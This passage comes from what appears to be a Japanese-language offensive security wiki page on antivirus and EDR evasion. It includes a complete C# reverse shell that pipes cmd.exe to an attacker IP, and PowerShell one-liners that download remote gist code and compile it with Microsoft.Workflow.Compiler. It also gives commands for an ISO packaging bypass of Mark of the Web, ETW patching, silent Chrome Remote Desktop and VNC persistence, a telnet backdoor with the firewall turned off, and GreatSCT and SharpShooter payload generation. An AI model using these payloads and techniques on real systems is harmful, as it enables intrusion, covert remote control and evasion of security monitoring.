   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、難読化されたラッパー関数（`Class8.smethod_10`、…）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*本物の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化された TLV エンコード済みの byte array としてこれを保存しています。

この一連の手順により、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する場合に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC として使用でき、サンプルの自動トリアージに役立ちます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを強化できる、オープンソースの[LLVM](http://www.llvm.org/)コンパイルスイートのフォークを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラを変更せずに、`C++11/14`言語を使ってコンパイル時に難読化コードを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkで生成される難読化された演算のレイヤーを追加し、アプリケーションを解析しようとする人物の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなPEファイルを難読化できるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイル向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使ってLLVMがサポートする言語のコードを細粒度で難読化するframeworkです。ROPfuscatorは通常の命令をROP chainに変換してassembly codeレベルでプログラムを難読化し、通常の制御フローという自然な概念を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをshellcodeに変換してロードできます。

### LLVM compilerによる関数単位の自己マスキング

implant全体をスリープ中にのみマスキングする代わりに、変更されたLLVM X86 backendを使うと、選択した関数が非アクティブな間、常にXORでマスキングできます。Function Peekaboo PoCは、デマングルされた名前に`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubを挿入し、共有のマスキングhandlerを`.text`に1つ出力します。source-level signatureとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backendの制御フロー変換

この処理は、instruction selectionとoptimizationの後に行います。変換では**出力されるすべてのreturn**を対象にし、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`で最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加されたepilogueにフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラが生成したstack/frameのteardownは維持し、return命令自体のみをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`で関数ごとのstubを出力し、`emitEndOfAsmFile()`でhandlerを出力します。出力段階をまたいで共有するsymbolを使えば、prologueのbranchで後に出力されるepilogueを参照できます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4-byteのMC expression `target - address_after_je`を書き込みます。handlerへのcallとjumpは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。何も変更していない未選択の関数について、passは`false`を返す必要があります。PoCはこの経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadataとpre-CRT初期化

PoCは、XOR keyと、loaderによってrelocationされる関数ポインターおよび実行時の長さを含む16-byteのrecordを`.funcmeta`に配置します。Cのfieldは`uint32_t`ですが、handlerはrecordのoffset `+8`にあるQWORDを読み取り、長さとそのpaddingを消費して、recordを`0x10`ずつ進めます。PE section名は8 byteまでなので、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stub内に元のentry-point RVAを保存してから、`AddressOfEntryPoint`をリダイレクトします。このPIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+のimportをたどって、すでにimportされている`VirtualProtect`を解決し、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadata内の各関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだclear状態のbodyをスキップします。その後、epilogueは`call handler`を実行します。handlerが13個のregister（`0x68` byte）を保存した後、`[rsp+0x68]`にあるreturn addressが変換後の関数の終端となるため、`end - start`をmetadata recordに書き込めます。すべてのbodyがマスキングされた後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`にジャンプします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称handlerを呼び出してbodyをdecodeします。最終経路は追加されたepilogueにフォールスルーし、それ以前のreturnはすべて共有handlerに直接ジャンプします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再マスキング後にhandlerの`ret`が呼び出し元のreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### マスキング処理と解析指標

handlerは現在のrecordを見つけ、固定長の可視prologue（このbuildでは`0x46` byte）をスキップし、残りを`PAGE_EXECUTE_READWRITE`に変更します。その後、低位のkey byteで1 byteずつXORし、最後に`PAGE_EXECUTE_READ`に設定します。この同じloopが、entry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計で特に有力な指標は次のとおりです。<sup>[[38]](#references)[[39]](#references)</sup>

- entry pointが実行可能な`.stub`内にあり、`.funcmet` sectionにkeyとrelocation済みの`.text` pointerが格納されている。
- pre-CRTでPEB、import table、section tableを解析し、その後、各metadata pointer経由でcallする。
- 同一の`call`/`pop` PIC prologueと、1つのhandlerにリダイレクトされた多数のreturn site。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続き、`VirtualProtect`の切り替えと、image-backedの実行可能ページへのbyte単位のXOR書き込みを繰り返す。

これはmemory scannerを回避する手法であり、暗号学的な保護ではありません。patch済みファイルには元のclearなbodyが残っており、debuggerで`VirtualProtect`やXOR loopにbreakを設定すれば、実行中の関数をdumpできます。1-byte XOR、読み取り可能なmetadata、固定の`0x46`境界により、オフラインでの復元も容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotはthread-localですが、変更されたcode pageはprocess-wideです。そのため、並行または再帰的なentryが発生すると、別の呼び出しが実行中の間に命令が再び切り替わる可能性があります。また、例外やnonlocal exitによって再マスキングがスキップされることもあります。堅牢な実装では、切り替えを同期し、`lpflOldProtect`を通じて返された実際のprotectionを復元し、stubの長さをハードコードせず、x64のstack alignmentに関して`call`と`jmp`の両方の経路を監査し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能なcodeを変更した場合のinstruction-cache coherencyは呼び出し側の責任であると明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、エンドユーザーが悪意のある可能性のあるアプリケーションを実行しないよう保護することを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションはSmartScreenを起動させ、エンドユーザーに警告してファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元のURLも記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **trusted**な署名証明書で署名された実行ファイルでは、**SmartScreenは起動しない**ことに注意してください。

payloadにMark of The Webが付与されないようにする非常に効果的な方法は、ISOなどのコンテナに格納することです。これは、Mark-of-the-Web（MOTW）を**non NTFS**ボリュームに適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadを出力コンテナに格納するツールです。

使用例：

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windows の強力なログ記録メカニズムです。ただし、セキュリティ製品が悪意のあるアクティビティを監視・検知するために使うこともできます。

AMSI を無効化（バイパス）するのと同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数をパッチして、イベントをログに記録せずに即座に戻るようにすることも可能です。これにより、そのプロセスの ETW ログ記録を実質的に無効化できます。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# バイナリをメモリ内にロードする手法は以前から知られており、AV に検知されずに post-exploitation ツールを実行する非常に優れた方法として、今も利用されています。

payload はディスクに触れることなく直接メモリにロードされるため、プロセス全体で AMSI をパッチすることだけを考慮すればよいでしょう。

ほとんどの C2 framework（sliver、Covenant、metasploit、CobaltStrike、Havoc など）は、C# assemblies を直接メモリ内で実行する機能をすでに備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

これは、**新しい sacrificial process を起動**し、その新しいプロセスに post-exploitation の悪意のあるコードを inject して実行し、完了後に新しいプロセスを終了させる方法です。この方法にはメリットとデメリットがあります。fork and run 方式のメリットは、Beacon implant process の**外部**で実行されることです。つまり、post-exploitation の動作中に問題が起きたり検知されたりしても、**implant が生き残る可能性が大幅に高くなります。** デメリットは、**Behavioural Detections** に検知される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitation の悪意のあるコードを**自身のプロセス内に** inject する方法です。新しいプロセスを作成して AV にスキャンされるのを避けられますが、payload の実行中に問題が起きるとクラッシュする可能性があるため、**beacon を失う可能性が大幅に高くなる**というデメリットがあります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、同記事の InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

**PowerShell から** C# Assemblies をロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t の動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を確認してください。

## NativeAOT WebAssembly repackaging of .NET tools (WasmForge)

通常の `execute-assembly` 技法では、識別可能な MSIL が残り、最終的に CLR が初期化されます。**WasmForge** は実行基盤そのものを変更します。C# プロジェクトを実験的な NativeAOT-LLVM WASI target に移行し、WebAssembly に ahead-of-time コンパイルしてから、そのモジュールを Wazero ベースの Windows PE host に埋め込みます。生成されたプロセスは対象の CLR、JIT、`dotnet` host を必要としないため、managed assembly 名、CLR のロード、AMSI、.NET ETW だけを対象とするルールでは、直接的な可視性が失われます。これは evasion/packaging technique であり、権限境界のバイパスではありません。guest は元のツールと同じ権限を保持し、OS 上での動作も観測可能です。<sup>[[44]](#references)[[45]](#references)</sup>

### C# プロジェクトのビルド

推奨されるビルド方法は、プロジェクトの Docker 環境を使用することです。この環境には .NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、linker、署名に必要な依存関係が含まれています。`.csproj` は自動検出され、ワンショットのビルドで移行、互換性パッチの適用、WASM のコンパイル、PE の生成、署名が行われます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

トラブルシューティングや生成されたコードのレビューでは、処理を `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` に分けて実行します。ビルドイメージでは `wasm-component-ld` wrapper も使用し、WASI Preview 2 の component encoding を避けて、埋め込みランタイムが想定する通常の module を生成します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# から x64 Win32 への橋渡し

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が利用できない、または動作が変わります。また、wasm32 の guest は通常、ポインター用に4バイトのスロットを確保しますが、x64 API は8バイトのポインターを返すことがあります。WasmForge は、以下の生成レイヤーで両方の問題に対処します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有のセマンティクスの違いを修正し、未サポートの registry、pipes、WMI、identity、directory-service、file-version、LSA などの呼び出しを `Wf*` helper にリダイレクトします。
2. P/Invoke scanner が NativeAOT の `DirectPInvoke` mapping を生成し、`[DllImport]` 呼び出しが guest 内で宣言された DLL を動的にロードするのではなく、リンク済みの C bridge symbol にバインドされるようにします。
3. Host-bound pointer には C# で `ulong`、C で `uint64_t` を使用します。汎用 dispatcher が呼び出しを host の Win32 handler に転送します。`out8_mask` は、上位半分を保持する必要がある、実際に8バイトの出力スロットを示します。マークされていない wasm32 形式の出力には snapshot/restore による保護が適用され、x64 による書き込みが隣接する4バイトを破損しないようにします。
4. 専用の host bridge が、汎用 syscall dispatch に適さない操作を処理します。たとえば、LSA ticket-cache へのアクセス、構造化された結果を返す Kerberos/BCrypt 操作、TCP KDC 通信、LDAP query などです。

たとえば、`version.dll!VerQueryValueW` 用の wrapper は4つの host address を渡し、値ポインターと長さが8バイトの出力スロットであるため、ビット2と3（`0xC`）を設定します。wrapper 自体は汎用のままで、DLL 名、export 名、引数、mask を `wf_call_v2` に渡します。host がポインターを変換し、native API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検知の切り替え先

Reflectionを多用するコード、動的なアセンブリ読み込み、任意のネイティブコールバック、WASMメモリに返される複雑なx64構造体には、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用のWASI Preview 2ソケットもno-opスタブに到達する場合があるため、対応ツールではプロトコル固有のhost shimを使用します。機能が同等だと決めつけず、各コマンドをネイティブビルドと照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法はtelemetryを移すものであり、payloadを不可視にするわけではありません。検知の対象は、WASMモジュールを含む、または生成するPE、Wazeroのようなruntimeの挙動、通常とは異なるhost/guest間のメモリ割り当てやコピー、汎用の直接的なWin32呼び出し、署名やPEリソースの異常、さらにその結果として発生するAPI呼び出しやネットワークトラフィックに切り替わる可能性があります。したがって、CLR読み込み、AMSI、.NET ETWイベントがないことを、プロセスが無害である証拠として扱うべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、侵害したマシンから**攻撃者が管理するSMB共有上にインストールされたインタープリター環境**にアクセスできるようにすることで、他の言語を使って悪意あるコードを実行できます。

SMB共有上のインタープリターのバイナリと環境へのアクセスを許可すれば、侵害したマシンの**メモリ内で、これらの言語による任意のコードを実行**できます。

リポジトリによると、Defenderは引き続きスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで、**静的シグネチャを回避する柔軟性が高まります**。これらの言語でランダムな難読化なしのreverse shellスクリプトを使ったテストは成功しています。

## 静的解析の回避を目的としたWebAssemblyの再ホスト

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げることで、プロセスを稼働させたまま、特権を必要とする検査や修復アクションを実行できないようにできます。

これを防ぐには、Windowsでセキュリティプロセスのトークンに対するハンドルを外部プロセスが取得できないようにする必要があります。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopを導入し、それを使って乗っ取り、永続性を維持するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のマシンでインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、「次へ」をクリックします。ウィザードで認証を求められるので、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を調整して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うとGUIを使わずにPINを設定できます）。
 

## 高度な回避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

回避は非常に複雑なテーマです。1つのシステム内でも多くの異なるtelemetryの情報源を考慮しなければならない場合があり、成熟した環境で完全に検知を免れるのはほぼ不可能です。

対処する環境ごとに、それぞれ異なる強みと弱点があります。

高度な回避手法の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)のこの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

[@mariuszbit](https://twitter.com/mariuszbit)による、Evasion in Depthについてのこちらの講演もおすすめです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defenderが悪意ありと判定する箇所の確認**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**Defenderが悪意ありと判定する箇所を特定するまでバイナリの一部を削除し**、その部分を切り分けられます。\
同じことを行う別のツールが[**avred**](https://github.com/dobin/avred)です。サービスは[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)で公開されています。

### **Telnet Server**

Windows 10以前のWindowsにはすべて、次のように（管理者として）インストールできる**Telnet server**が付属していました。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**起動**するように設定し、今すぐ**実行**します:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更**（ステルス）してファイアウォールを無効化:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setupではなく、binのダウンロードを選びます)

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を**victim**に移動します

#### **Reverse connection**

**attacker**は、自身の**ホスト内で**バイナリ `vncviewer.exe -listen 5900` を**実行**し、reverse **VNC connection**を受け取れる状態にしておきます。次に、**victim**内で: winvncデーモン `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** stealthを保つには、次の操作をしないでください

- `winvnc`がすでに実行中の場合は起動しないでください。[popup](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc`で実行中か確認してください
- 同じディレクトリに`UltraVNC.ini`がない状態で`winvnc`を起動しないでください。[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
- ヘルプを表示するために`winvnc -h`を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

こちらからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCTの内部:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc` で **lister** を起動し、次の **xml payload** を **実行**します:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在のDefenderはプロセスを非常に速く終了させます。**

### 独自のreverse shellをコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# Revershell

次のコマンドでコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のように使用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscatorsの一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorをビルドするためのpythonの使用例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

